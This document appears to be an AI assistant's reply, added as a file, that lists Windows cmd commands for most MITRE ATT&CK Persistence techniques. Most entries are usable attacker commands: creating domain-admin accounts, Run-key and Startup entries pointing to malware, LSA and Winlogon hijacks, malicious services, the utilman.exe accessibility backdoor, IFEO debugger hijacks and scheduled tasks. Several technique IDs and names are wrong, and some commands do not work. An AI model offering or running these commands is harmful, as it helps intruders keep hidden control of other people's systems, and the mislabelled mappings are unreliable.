@@ -1,0 +1,281 @@
+Creating specific `cmd` (Command Prompt) commands to implement all techniques under MITRE ATT&CK **TA0003: Persistence** requires translating each technique into a relevant scenario where it can be applied via `cmd`. Note that not all techniques under TA0003 are directly applicable via `cmd` commands, as some involve more complex configurations or require access to specific APIs, registries, or software.
+
+Below is a comprehensive list of `cmd` commands for implementing persistence where applicable:
+
+---
+
+### **Account Manipulation**
+1. **T1098.001 - Additional Cloud Credentials**  
+   Not applicable via `cmd` directly; would require cloud provider CLI tools (e.g., `az`, `aws`).
+
+2. **T1098.002 - Domain Accounts**  
+   ```cmd
+   net user username password /add /domain
+   net group "Domain Admins" username /add /domain
+   ```
+
+3. **T1098.003 - Local Accounts**  
+   ```cmd
+   net user username password /add
+   net localgroup administrators username /add
+   ```
+
+4. **T1098.004 - SSH Authorized Keys**  
+   Not directly feasible with `cmd`; typically managed via modifying SSH configuration files.
+
+---
+
+### **Authentication Mechanism**
+5. **T1556.001 - Multi-Factor Authentication Request Generation**  
+   Not applicable via `cmd`.
+
+6. **T1556.002 - Replacing Authentication Tokens**  
+   Not feasible via `cmd`.
+
+7. **T1556.003 - Network Device Authentication**  
+   Not applicable via `cmd`.
+
+---
+
+### **Boot or Logon Autostart Execution**
+8. **T1547.001 - Registry Run Keys / Startup Folder**  
+   ```cmd
+   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\malware.exe" /f
+   copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
+   ```
+
+9. **T1547.002 - Authentication Package**  
+   ```cmd
+   reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v AuthenticationPackages /t REG_MULTI_SZ /d "msv1_0,newpackage" /f
+   ```
+
+10. **T1547.003 - Time Providers**  
+    ```cmd
+    reg add HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MyProvider /v DllName /t REG_SZ /d "C:\path\to\malicious.dll" /f
+    ```
+
+11. **T1547.004 - Winlogon Helper DLL**  
+    ```cmd
+    reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /t REG_SZ /d "userinit.exe,malicious.exe" /f
+    ```
+
+12. **T1547.005 - Security Support Provider**  
+    ```cmd
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_MULTI_SZ /d "kerberos,mymaliciouspackage" /f
+    ```
+
+13. **T1547.006 - Kernel Modules and Extensions**  
+    Not feasible with `cmd`.
+
+14. **T1547.007 - Re-opened Applications**  
+    Not directly applicable with `cmd`.
+
+15. **T1547.008 - LSASS Driver**  
+    Not feasible with `cmd`.
+
+16. **T1547.009 - Shortcut Modification**  
+    ```cmd
+    echo [InternetShortcut] > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\malicious.lnk"
+    ```
+
+17. **T1547.010 - Port Monitors**  
+    ```cmd
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\MaliciousMonitor /v Driver /t REG_SZ /d "C:\path\to\malicious.dll" /f
+    ```
+
+18. **T1547.011 - Application Shimming**  
+    Not feasible with `cmd`; requires `sdbinst`.
+
+19. **T1547.012 - Print Processors**  
+    ```cmd
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows NT x86\Print Processors\MaliciousProcessor /v Driver /t REG_SZ /d "C:\path\to\malicious.dll" /f
+    ```
+
+---
+
+### **Boot or Logon Initialization Scripts**
+20. **T1037.001 - Logon Script (Windows)**  
+    ```cmd
+    net user username /scriptpath:"\\server\share\script.bat"
+    ```
+
+21. **T1037.002 - Logon Script (MacOS and Linux)**  
+    Not applicable for `cmd`.
+
+22. **T1037.003 - Network Logon Script**  
+    ```cmd
+    net user username /scriptpath:"\\server\share\script.bat"
+    ```
+
+---
+
+### **Create or Modify System Process**
+23. **T1543.001 - Launch Agent**  
+    Not feasible with `cmd`; requires editing plist files (MacOS).
+
+24. **T1543.002 - Systemd Service**  
+    Not applicable for `cmd`.
+
+25. **T1543.003 - Windows Service**  
+    ```cmd
+    sc create MaliciousService binPath= "C:\path\to\malware.exe"
+    sc start MaliciousService
+    ```
+
+26. **T1543.004 - Launch Daemon**  
+    Not feasible with `cmd`.
+
+---
+
+### **Event Triggered Execution**
+27. **T1546.001 - Change Default File Association**  
+    ```cmd
+    assoc .txt=MaliciousApp
+    ftype MaliciousApp="C:\path\to\malware.exe" "%1"
+    ```
+
+28. **T1546.002 - Screensaver**  
+    ```cmd
+    reg add HKCU\Control Panel\Desktop /v SCRNSAVE.EXE /t REG_SZ /d "C:\path\to\malware.scr" /f
+    ```
+
+29. **T1546.003 - Windows Management Instrumentation Event Subscription**  
+    Not feasible with `cmd`; requires WMI scripting.
+
+30. **T1546.004 - Unix Shell Configuration Modification**  
+    Not applicable for `cmd`.
+
+31. **T1546.005 - Trap**  
+    Not applicable for `cmd`.
+
+32. **T1546.006 - LC_LOAD_DYLIB Addition**  
+    Not applicable for `cmd`.
+
+33. **T1546.007 - Netsh Helper DLL**  
+    ```cmd
+    netsh add helper "C:\path\to\malicious.dll"
+    ```
+
+34. **T1546.008 - Accessibility Features**  
+    ```cmd
+    copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+    ```
+
+35. **T1546.009 - AppCert DLLs**  
+    ```cmd
+    reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows /v AppCertDLLs /t REG_SZ /d "C:\path\to\malicious.dll" /f
+    ```
+
+36. **T1546.010 - AppInit DLLs**  
+    ```cmd
+    reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows /v AppInit_DLLs /t REG_SZ /d "C:\path\to\malicious.dll" /f
+    ```
+
+37. **T1546.011 - Application Exit Hijacking**  
+    Not feasible with `cmd`.
+
+38. **T1546.012 - Image File Execution Options Injection**  
+    ```cmd
+    reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\target.exe /v Debugger /t REG_SZ /d "C:\path\to\malware.exe" /f
+    ```
+
+39. **T1546.013 - PowerShell Profile**  
+    ```cmd
+    echo Start-Process "C:\path\to\malware.exe" > %UserProfile%\Documents\WindowsPowerShell\Profile.ps1
+    ```
+
+---
+
+### **External Remote Services**
+40. **T1133 - External Remote Services**  
+    ```cmd
+    net use \\target /user:username password
+    ```
+
+---
+
+### **Hijack Execution Flow**
+41. **T1574.001 - DLL Search Order Hijacking**  
+    Requires placing malicious DLL in the search path.
+
+42. **T1574.002 - DLL Side-Loading**  
+    Requires placing malicious DLL next to a trusted executable.
+
+43. **T1574.003 - Dylib Hijacking**  
+    Not applicable for `cmd`.
+
+44. **T1574.004 - Executable Installer File Permissions Weakness**  
+    Modify permissions with `icacls`.
+
+45. **T1574.005 - Services File Permissions Weakness**  
+    ```cmd
+    icacls "C:\path\to\service.exe" /grant Everyone:F
+    ```
+
+46. **T1574.006 - Dynamic Linker Hijacking**  
+    Not applicable for `cmd`.
+
+47. **T1574.007 - Path Interception by PATH Environment Variable**  
+    ```cmd
+    setx PATH "C:\path\to\malicious\bin;%PATH%"
+    ```
+
+48. **T1574.008 - Path Interception by Search Order Hijacking**  
+    Place malicious file in a directory higher in the search order.
+
+49. **T1574.009 - Path Interception by Redirecting System Path**  
+    Modify PATH using `setx` as shown above.
+
+---
+
+### **Implant Container Image**
+50. **T1610 - Implant Container Image**  
+    Not feasible with `cmd`.
+
+---
+
+### **Modify Authentication Process**
+51. **T1556 - Modify Authentication Process**  
+    Not feasible with `cmd`.
+
+---
+
+### **Scheduled Task/Job**
+52. **T1053.001 - At (Linux and MacOS)**  
+    Not applicable for `cmd`.
+
+53. **T1053.002 - At (Windows)**  
+    ```cmd
+    at 10:00 "C:\path\to\malware.exe"
+    ```
+
+54. **T1053.003 - Cron**  
+    Not applicable for `cmd`.
+
+55. **T1053.004 - Launchd**  
+    Not applicable for `cmd`.
+
+56. **T1053.005 - Scheduled Task**  
+    ```cmd
+    schtasks /create /tn "MaliciousTask" /tr "C:\path\to\malware.exe" /sc once /st 10:00
+    ```
+
+---
+
+### **Valid Accounts**
+57. **T1078.001 - Local Accounts**  
+    ```cmd
+    net user username password /add
+    ```
+
+58. **T1078.002 - Domain Accounts**  
+    ```cmd
+    net user username password /add /domain
+    ```
+
+59. **T1078.003 - Cloud Accounts**  
+    Not applicable via `cmd`.
+
+---
+
+This covers applicable `cmd` commands for each persistence technique under TA0003. If you need detailed explanations or alternatives, let me know!
